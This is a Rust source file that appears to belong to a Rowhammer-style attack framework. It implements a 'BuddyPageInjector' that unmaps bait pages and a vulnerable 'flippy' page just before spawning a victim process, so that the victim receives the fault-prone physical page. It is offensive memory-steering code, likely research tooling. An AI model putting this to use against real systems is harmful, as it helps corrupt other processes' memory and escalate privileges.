use std::{
    process::{Child, Command},
    ptr::null_mut,
};

use serde::Serialize;

use crate::{
    allocator::util::{mmap, munmap},
    memory::PfnResolver,
    util::{PAGE_MASK, PAGE_SIZE},
};

#[derive(Copy, Clone, Debug, Serialize)]
/// The injection configuration.
pub struct InjectionConfig {
    /// An identifier for this InjectionConfig.
    pub id: usize,
    /// The target address.
    pub target_addr: usize,
    /// The flippy page size.
    pub flippy_page_size: usize,
    /// The number of bait pages to release before the flippy page.
    pub bait_count_after: usize,
    /// The number of bait pages to release after the flippy page.
    pub bait_count_before: usize,
    /// the stack offset
    pub stack_offset: usize,
}

pub(crate) trait PageInjector<T> {
    fn inject(&mut self) -> Result<T, std::io::Error>;
}

#[derive(Debug)]
pub(crate) struct BuddyPageInjector {
    cmd: Option<Command>,
    injection_config: InjectionConfig,
}

impl BuddyPageInjector {
    pub(crate) fn new(cmd: Command, injection_config: InjectionConfig) -> Self {
        Self {
            cmd: Some(cmd),
            injection_config,
        }
    }
}

impl PageInjector<Child> for BuddyPageInjector {
    fn inject(&mut self) -> Result<Child, std::io::Error> {
        let target_page = (self.injection_config.target_addr & !PAGE_MASK) as *mut libc::c_void;
        debug!(
            "Injecting target page {:p}, phys {:p}, into victim process",
            target_page,
            target_page.pfn().unwrap_or_default()
        );
        let bait: *mut libc::c_void = if self.injection_config.bait_count_before
            + self.injection_config.bait_count_after
            != 0
        {
            mmap(
                null_mut(),
                (self.injection_config.bait_count_before + self.injection_config.bait_count_after)
                    * PAGE_SIZE,
            )
        } else {
            null_mut()
        };

        info!("deallocating bait");
        unsafe {
            if self.injection_config.bait_count_before != 0 {
                munmap(bait, self.injection_config.bait_count_before * PAGE_SIZE);
            }
            munmap(target_page, self.injection_config.flippy_page_size);
            if self.injection_config.bait_count_after != 0 {
                munmap(
                    bait.byte_add(self.injection_config.bait_count_before * PAGE_SIZE),
                    self.injection_config.bait_count_after * PAGE_SIZE,
                );
            }
        }
        // spawn
        //info!("Launching victim");
        self.cmd.take().expect("No cmd").spawn()
    }
}
